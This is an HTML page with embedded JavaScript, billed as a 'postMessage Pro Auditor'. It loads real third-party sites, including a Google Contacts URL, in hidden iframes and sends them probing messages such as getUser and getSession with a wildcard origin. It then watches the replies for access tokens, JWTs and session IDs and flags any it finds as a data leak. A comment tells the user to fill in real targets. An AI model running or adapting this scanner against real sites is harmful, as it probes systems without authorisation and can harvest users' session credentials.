<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>postMessage Pro Auditor</title>
<style>
body { font-family: Arial; text-align:center; margin-top:30px; background:#000; color:#0f0;}
button { padding:15px 25px; font-size:16px; }
pre { background:#111; color:#0f0; padding:10px; width:95%; height:320px; overflow:auto; margin:auto;}
</style>
</head>
<body>

<h2>postMessage Pro Auditor</h2>
<button onclick="start()">Start Scan</button>

<pre id="log">Waiting...</pre>

<script>
const TARGETS = [
    "https://contacts.google.com/other"
    // isi target real (non big-tech)
];

const log = (m) => {
    const el = document.getElementById("log");
    el.innerText += "\n" + m;
    el.scrollTop = el.scrollHeight;
};

function now() {
    return new Date().toISOString();
}

// 🔒 strict sensitive detection (NO FALSE POSITIVE)
function isSensitive(data) {
    if (!data || typeof data !== "object") return false;

    const keys = Object.keys(data);

    return keys.some(k =>
        ["token","access_token","authToken","sessionId","jwt"].includes(k)
    );
}

// 🔍 deep analyzer
function analyze(e) {
    log("\n=== MESSAGE ===");
    log("Time: " + now());
    log("Origin: " + e.origin);

    try {
        const preview = JSON.stringify(e.data).slice(0,400);
        log("Data: " + preview);
    } catch {}

    if (e.origin !== location.origin) {
        log("🚨 CROSS-ORIGIN");
    }

    if (isSensitive(e.data)) {
        log("🔥 CONFIRMED SENSITIVE DATA LEAK");
        document.body.style.background = "darkred";
    }
}

// 🎯 listener
window.addEventListener("message", analyze);

// 🚀 payload set (realistic, not random spam)
const PAYLOADS = [
    {type:"ping"},
    {action:"init"},
    {method:"getUser"},
    {cmd:"getSession"},
    {request:"profile"},
    {debug:true}
];

// 🚀 scan runner
function start() {
    TARGETS.forEach((url, i) => {
        setTimeout(() => {
            const iframe = document.createElement("iframe");
            iframe.src = url;
            iframe.style.display = "none";
            document.body.appendChild(iframe);

            log("\n[*] Loaded: " + url);

            // wait load
            setTimeout(() => {
                PAYLOADS.forEach((p, j) => {
                    setTimeout(() => {
                        try {
                            iframe.contentWindow.postMessage(p, "*");
                            log("[>] Sent → " + JSON.stringify(p));
                        } catch(e){}
                    }, j * 400);
                });
            }, 2500);

        }, i * 3000);
    });
}
</script>

</body>
</html>
